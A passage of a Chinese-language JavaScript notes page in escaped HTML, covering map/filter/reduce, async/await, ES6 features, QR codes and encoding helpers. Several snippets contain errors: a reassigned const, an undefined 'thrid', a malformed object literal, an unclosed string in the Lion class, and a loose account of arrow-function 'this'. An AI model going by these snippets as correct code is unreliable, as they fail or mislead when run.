Bad Code</span>\n<span class=\"token keyword\">const</span> total <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> withTax <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> highValue <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> orders<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token comment\">// Reduce</span>\n  total <span class=\"token operator\">+=</span> orders<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token comment\">// Map</span>\n  withTax<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>orders<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">1.1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token comment\">// Filter</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>orders<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> <span class=\"token number\">100</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    highValue<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>orders<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// Good Code</span>\n<span class=\"token keyword\">const</span> total <span class=\"token operator\">=</span> orders<span class=\"token punctuation\">.</span><span class=\"token function\">reduce</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">acc<span class=\"token punctuation\">,</span> cur</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> acc <span class=\"token operator\">+</span> cur<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> withTax <span class=\"token operator\">=</span> orders<span class=\"token punctuation\">.</span><span class=\"token function\">map</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">v</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> v <span class=\"token operator\">*</span> <span class=\"token number\">1.1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> highValue <span class=\"token operator\">=</span> orders<span class=\"token punctuation\">.</span><span class=\"token function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">v</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> v <span class=\"token operator\">></span> <span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h4 id=\"async--await-1\">async / await</h4>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> <span class=\"token function-variable function\">random</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">return</span> Promise<span class=\"token punctuation\">.</span><span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span>Math<span class=\"token punctuation\">.</span><span class=\"token function\">random</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// Bad Code</span>\n<span class=\"token keyword\">const</span> <span class=\"token function-variable function\">sumRandomAsyncNums</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">let</span> first<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">let</span> second<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">let</span> third<span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">return</span> <span class=\"token function\">random</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">v</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n      first <span class=\"token operator\">=</span> v<span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">return</span> <span class=\"token function\">random</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">v</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n      second <span class=\"token operator\">=</span> v<span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">return</span> <span class=\"token function\">random</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">v</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n      third <span class=\"token operator\">=</span> v<span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">return</span> first <span class=\"token operator\">+</span> second <span class=\"token operator\">+</span> thrid<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">v</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n      console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">Result </span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>v<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// Good Code</span>\n<span class=\"token keyword\">const</span> <span class=\"token function-variable function\">sumRandomAsyncNums</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">async</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">const</span> first <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> <span class=\"token function\">random</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">const</span> second <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> <span class=\"token function\">random</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">const</span> thrid <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> <span class=\"token function\">random</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n  console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">Result </span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>first <span class=\"token operator\">+</span> second <span class=\"token operator\">+</span> thrid<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></code></pre><h3 id=\"es6-加進的新功能\">ES6 加進的新功能</h3>\n<h4 id=\"1-default-parameters\">1. Default Parameters</h4>\n<p>更快速的 function 參數給定預設值：</p>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">var</span> <span class=\"token function-variable function\">link</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span>height <span class=\"token operator\">=</span> <span class=\"token number\">50</span><span class=\"token punctuation\">,</span> color <span class=\"token operator\">=</span> <span class=\"token string\">\"red\"</span><span class=\"token punctuation\">,</span> url <span class=\"token operator\">=</span> <span class=\"token string\">\"https://example.com\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token comment\">// ...</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></code></pre><h4 id=\"2-template-literals\">2. Template Literals</h4>\n<p>允許透過語法 <code>${val}</code> 將變數嵌入至字串中：</p>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">var</span> name <span class=\"token operator\">=</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">Your name is </span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>first<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\"> </span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>last<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">.</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">;</span></code></pre><h4 id=\"3-multi-line-strings\">3. Multi-line Strings</h4>\n<p>允許使用 `（backticks）接受多行字串指定：</p>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">var</span> name <span class=\"token operator\">=</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">first line\nsecond line</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">;</span></code></pre><h4 id=\"4-destructing-assignment\">4. Destructing Assignment</h4>\n<pre class=\"language-javascript\"><code class=\"language-javascript\">object<span class=\"token punctuation\">[</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> …rest<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>    <span class=\"token comment\">// 1</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>    <span class=\"token comment\">// 2</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>rest<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [3, 4, 5]</span>\n\n<span class=\"token keyword\">var</span> o <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>p<span class=\"token operator\">:</span> <span class=\"token number\">42</span><span class=\"token punctuation\">,</span> q<span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">var</span> <span class=\"token punctuation\">{</span>p<span class=\"token punctuation\">,</span> q<span class=\"token punctuation\">}</span> <span class=\"token operator\">=</span> o<span class=\"token punctuation\">;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 42</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// true</span></code></pre><h4 id=\"5-object-literals\">5. Object Literals</h4>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">function</span> <span class=\"token function\">getCar</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">make<span class=\"token punctuation\">,</span> model<span class=\"token punctuation\">,</span> value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n <span class=\"token keyword\">return</span> <span class=\"token punctuation\">{</span>\n   <span class=\"token comment\">// with property value shorthand</span>\n  <span class=\"token comment\">// syntax, you can omit the property</span>\n  <span class=\"token comment\">// value if key matches variable</span>\n  <span class=\"token comment\">// name</span>\n  make<span class=\"token punctuation\">,</span> <span class=\"token comment\">// same as make: make</span>\n  model<span class=\"token punctuation\">,</span> <span class=\"token comment\">// same as</span>\n  model<span class=\"token operator\">:</span> model\n  value<span class=\"token punctuation\">,</span> <span class=\"token comment\">// same as value: value</span>\n  <span class=\"token comment\">// computed values now work with</span>\n  <span class=\"token comment\">// object literals</span>\n  <span class=\"token punctuation\">[</span><span class=\"token string\">'make'</span> <span class=\"token operator\">+</span> make<span class=\"token punctuation\">]</span><span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span>\n  <span class=\"token comment\">// Method definition shorthand syntax</span>\n  <span class=\"token comment\">// omits `function` keyword &amp; colon</span>\n  <span class=\"token function\">depreciate</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>value <span class=\"token operator\">-=</span> <span class=\"token number\">2500</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">let</span> car <span class=\"token operator\">=</span> <span class=\"token function\">getCar</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Kia'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Sorento'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">40000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h4 id=\"6-arrow-function\">6. Arrow Function</h4>\n<p>箭頭函式亦會更改物件裡的 this 指向行為，從原本的指向呼叫者改為指向其所屬物件</p>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token punctuation\">(</span><span class=\"token parameter\">param1<span class=\"token punctuation\">,</span> param2<span class=\"token punctuation\">,</span> <span class=\"token operator\">...</span><span class=\"token punctuation\">,</span> paramN</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span> statements <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">(</span><span class=\"token parameter\">param1<span class=\"token punctuation\">,</span> param2<span class=\"token punctuation\">,</span> <span class=\"token operator\">...</span><span class=\"token punctuation\">,</span> paramN</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> expression\n<span class=\"token comment\">// 等於 : => { return expression; }</span>\n\n<span class=\"token comment\">// 只有一個參數時, 括號才能不加:</span>\n<span class=\"token punctuation\">(</span><span class=\"token parameter\">singleParam</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span> statements <span class=\"token punctuation\">}</span>\n<span class=\"token parameter\">singleParam</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span> statements <span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// 若無參數, 就一定要加括號:</span>\n<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span> statements <span class=\"token punctuation\">}</span></code></pre><h4 id=\"7-promise\">7. Promise</h4>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">var</span> <span class=\"token function-variable function\">wait1000</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span>\n  <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span> reject</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span>resolve<span class=\"token punctuation\">,</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">wait1000</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Yay!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token function\">wait1000</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Wheeyee!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h4 id=\"8-let--const-block-scoped\">8. Let &amp; Const, Block-Scoped</h4>\n<ul>\n<li><code>let</code> 和 <code>const</code> 的作用域從之前 <code>var</code> 的函式變成了離此變數最近的 <code>{}</code> 區塊範圍內</li>\n<li><code>let</code> 不可重覆宣告，執行時會吐出錯誤</li>\n<li><code>const</code> 宣告時即須初始化，並且不可修改</li>\n</ul>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">function</span> <span class=\"token function\">letExample</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">let</span> letValue <span class=\"token operator\">=</span> value<span class=\"token punctuation\">;</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"inside block\"</span><span class=\"token punctuation\">,</span> letValue<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// [SyntaxError] redeclaration of letValue would be a SyntaxError</span>\n    <span class=\"token keyword\">let</span> letValue <span class=\"token operator\">=</span> <span class=\"token string\">\"foo\"</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n  <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// [SyntaxError] Accessing letValue is a Reference Error because it</span>\n    <span class=\"token comment\">// was defined w/in if-block</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>letValue<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// if we get here, it means that the JS engine didn't</span>\n    <span class=\"token comment\">// throw an exception, which means that the engine</span>\n    <span class=\"token comment\">// (or transpiled code) did not faithfully reproduce</span>\n    <span class=\"token comment\">// how let should work</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"let not faithfully handled\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// e is a ReferenceError</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"letValue not accessible\"</span><span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token function\">letExample</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h4 id=\"9-classes\">9. Classes</h4>\n<p>ES6 透過 prototype 和 function 實作出了類 inheritance 結構的 class，但仍和傳統 Java、Python 的 class 有些差別</p>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">Cat</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token function\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">name</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> name<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n  <span class=\"token function\">speak</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>name <span class=\"token operator\">+</span> <span class=\"token string\">' makes a noise.'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Lion</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Cat</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token function\">speak</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">speak</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>name <span class=\"token operator\">+</span> ' roars<span class=\"token punctuation\">.</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre><h4 id=\"10-module\">10. Module</h4>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token comment\">// Export</span>\n<span class=\"token keyword\">export</span> <span class=\"token keyword\">var</span> port <span class=\"token operator\">=</span> <span class=\"token number\">3000</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">export</span> <span class=\"token keyword\">function</span> <span class=\"token function\">getAccounts</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">url</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token comment\">// ...</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// Import</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> port<span class=\"token punctuation\">,</span> getAccounts <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">\"module\"</span><span class=\"token punctuation\">;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h3 id=\"qr-code\">QR Code</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/bellbind/items/b80698ceddebb6dfe4aa\">JavaScript で実装してみる QR コードジェネレータ - Qiita</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://davidshimjs.github.io/qrcodejs/\">qrcode.js</a></li>\n</ul>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token function\">$</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"#qrcode_area\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">empty</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">new</span> <span class=\"token class-name\">QRCode</span><span class=\"token punctuation\">(</span><span class=\"token function\">$</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"#qrcode_area\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>qrcode_input<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h3 id=\"encode\">Encode</h3>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token function-variable function\">base64_encode</span><span class=\"token operator\">:</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">encode</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">try</span><span class=\"token punctuation\">{</span>\n                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> encode <span class=\"token punctuation\">)</span>\n                    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>base64_output <span class=\"token operator\">=</span> <span class=\"token function\">btoa</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>base64_input<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">else</span>\n                    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>base64_output <span class=\"token operator\">=</span> <span class=\"token function\">atob</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>base64_input<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span><span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span> error <span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n                <span class=\"token function\">alert</span><span class=\"token punctuation\">(</span>error<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n        <span class=\"token function-variable function\">url_encode</span><span class=\"token operator\">:</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">encode</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">try</span><span class=\"token punctuation\">{</span>\n                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> encode <span class=\"token punctuation\">)</span>\n                    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>url_output <span class=\"token operator\">=</span> <span class=\"token function\">encodeURI</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>url_input<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">else</span>\n                    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>url_output <span class=\"token operator\">=</span> <span class=\"token function\">decodeURI</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>url_input<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span><span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span> error <span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n                <span class=\"token function\">alert</span><span class=\"token punctuation\">(</span>error<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n        <span class=\"token function-variable function\">html_encode</span><span class=\"token operator\">:</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">space</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">const</span> html_entities <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">'\\\"'</span><span class=\"token 